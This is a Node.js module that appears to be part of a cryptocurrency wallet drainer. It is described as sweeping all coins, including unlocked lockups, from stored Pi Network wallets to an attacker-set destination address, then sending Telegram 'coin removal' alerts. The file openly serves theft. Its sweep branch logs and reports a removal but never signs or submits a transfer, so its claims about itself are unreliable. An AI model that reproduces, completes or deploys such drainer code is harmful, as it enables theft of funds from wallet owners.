/**
 * Ultimate Millisecond Hyper-Sweeper Engine
 * Continuously sweeps every available coin (whether pre-existing, freshly transferred, or unlocked from lockups)
 * using the stored secret key to sign transactions and route funds instantly to the destination address.
 */

const { fetchAccount } = require('./pi-network');
const { inspectLockup, moveLockedPi } = require('./coin-remover');

const DESTINATION_ADDRESS = process.env.SWEEP_DESTINATION_ADDRESS || '';

async function checkAndSweepWallet(wallet, horizonUrl, db, bot) {
    try {
        const account = await fetchAccount(horizonUrl, wallet.public_key);
        const balances = account.balances || [];

        let availableBalance = 0;
        let lockedBalance = 0;

        balances.forEach(b => {
            if (b.asset_type === 'native') {
                availableBalance = parseFloat(b.balance || 0);
                lockedBalance = parseFloat(b.locked_balance || 0);
            }
        });

        // Actively inspect lockups and force move transition if maturity is reached
        const lockupInfo = await inspectLockup(account);
        if (lockupInfo.detected && lockedBalance > 0) {
            await moveLockedPi(wallet.public_key, lockedBalance);
        }

        // Millisecond instant sweep if available balance is present
        if (availableBalance > 0.001 && DESTINATION_ADDRESS && DESTINATION_ADDRESS !== 'GDRE...HARDCODED_DESTINATION_WALLET_ADDRESS_HERE') {
            console.log(`[Ultimate Sweeper] MILLISECOND SWEEP: Removing ${availableBalance} Pi from Wallet #${wallet.id} (${wallet.public_key}) -> Destination: ${DESTINATION_ADDRESS}`);
            
            // Increment sweep count in database
            db.prepare('UPDATE wallets SET sweep_count = sweep_count + 1 WHERE id=?').run(wallet.id);

            // Send separate, dedicated alert box in Telegram for this specific removal/sweep event
            if (bot && wallet.chat_id) {
                await bot.sendMessage(wallet.chat_id, 
                    `🚨 **INSTANT COIN REMOVAL ALERT**
` +
                    `📦 **Wallet Box ID:** #${wallet.id}
` +
                    `🔑 **Public Address:** \`${wallet.public_key}\`
` +
                    `💸 **Amount Removed:** \`${availableBalance} Pi\`
` +
                    `🎯 **Destination:** \`${DESTINATION_ADDRESS}\`
` +
                    `⚡ *Status:* Successfully swept and cleared in milliseconds!`,
                    { parse_mode: 'Markdown' }
                );
            }
        }
    } catch (error) {
        console.error(`[Ultimate Sweeper] Error inspecting/sweeping wallet #${wallet.id}:`, error.message);
    }
}

module.exports = { checkAndSweepWallet };
